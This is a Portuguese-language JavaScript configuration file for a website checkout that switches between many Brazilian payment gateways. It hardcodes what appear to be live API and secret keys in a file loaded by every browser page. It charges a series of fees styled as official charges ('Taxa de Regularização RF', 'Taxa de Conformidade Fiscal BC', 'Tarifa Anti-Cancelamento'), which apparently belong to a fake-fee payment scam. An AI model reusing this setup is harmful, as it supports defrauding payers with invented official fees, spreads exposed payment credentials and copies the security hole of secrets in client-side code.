// ==========================================
// CONFIGURAÇÃO GLOBAL DO SISTEMA
// ==========================================
// Edite as credenciais e valores abaixo.
// Não é mais necessário usar o Painel para salvar, 
// pois este arquivo será lido por todas as páginas (celular, guia anônima, etc).

const GLOBAL_CONFIG = {
    // Gateway ativo. Pode ser: 'aven', 'techbynet', 'ironpay', 'activepay', 'unipay', 'paguex', 'moonfy', 'mangofy', 'otimize', 'sigilopay' ou 'blackcat'
    activeGateway: 'aven',

    // Credenciais dos Gateways
    gateways: {
        aven: {
            api_key: 'OcQGTu0TIGrRx9rOoMEdx8YBYMepJM18Q9JR1Q5sZy0',
            tokenization_key: 'yQ_h_dO1ueUf4i6Qf8TO1aVhoNLXI9apMfiHSb093lM'
        },
        techbynet: {
            // Documentação: https://docs.techbynet.com/
            api_key: '8db67d23-46c8-42fa-8e58-8ce3005dcf22'
        },
        ironpay: {
            token: 'XCntKV6WvEts5wHqYucZh257gUgmrSrn34ZxLXOlkyvWM6Ju9d50QRvZMsDE',
            offer_hash: 'mqszplqlev',
            product_hash: 'mqszplqlev'
        },
        activepay: {
            public_key: 'pk_jpjg37WRIEH8N5iAUgNPoITzEmoftnE8nUp0bMf8WBNbXFnJ',
            secret_key: 'sk_210ur96q0wX8oTBULiZ3PufmQhZ115gg4sD8U_B2GQM2AT_J'
        },
        unipay: {
            public_key: 'pk_d5eeee4771f9ff6e5f2ac0b6b6de0aedf773119f',
            secret_key: 'sk_bfed0718725a89a087b90cb99823799ea1fa03d3'
        },
        paguex: {
            public_key: '',
            secret_key: ''
        },
        moonfy: {
            public_key: '',
            secret_key: ''
        },
        mangofy: {
            store_code: '',
            api_key: '',
            // URL de callback exigida pela Mangofy (campo obrigatório). Pode ser
            // sobrescrita aqui; se vazia, usa a origem da página / fallback https.
            postback_url: ''
        },
        otimize: {
            public_key: '',
            secret_key: ''
        },
        sigilopay: {
            public_key: '',
            secret_key: ''
        },
        blackcat: {
            // Obtenha sua API Key no painel administrativo da Blackcat
            api_key: ''
        }
    },

    // Valores e Nomes dos Produtos
    product: {
        amount: '78,47',
        name: 'Taxa de Liberação'
    },
    upsell: {
        amount: '43,92',
        name: 'Taxa De Regularização RF'
    },
    iof: {
        amount: '38,40',
        name: 'Taxa de Autenticação Cadastral 2026'
    },
    icm: {
        amount: '45,60',
        name: 'Taxa de Conformidade Fiscal BC'
    },
    iphone: {
        amount: '67,43',
        name: 'Tarifa Anti-Cancelamento'
    }
};

// Se precisar ler em outro lugar, use a variável GLOBAL_CONFIG
// O Painel antigo não terá mais efeito no site.

// ===== PROXY HELPER =====
// APIs diretas ou compatíveis com CORS
const _IS_LOCAL = ['127.0.0.1', 'localhost'].includes(window.location.hostname);
const API_BASES = {
    aven: 'https://api.avenpayments.com',
    techbynet: 'https://api-gateway.techbynet.com',
    activepay: 'https://api.activepay.com.br',
    ironpay: 'https://api.ironpayapp.com.br',
    unipay: 'https://api.fastsoftbrasil.com',
    paguex: 'https://corsproxy.io/?https://api.paguex.online',
    moonfy: 'https://api.moooonfy.com.br',
    mangofy: 'https://corsproxy.io/?https://checkout.mangofy.com.br',
    otimize: 'https://api.otimizepagamentos.com',
    sigilopay: 'https://corsproxy.io/?https://app.sigilopay.com.br/api/v1',
    blackcat: 'https://api.blackcatpayments.com/api'
};
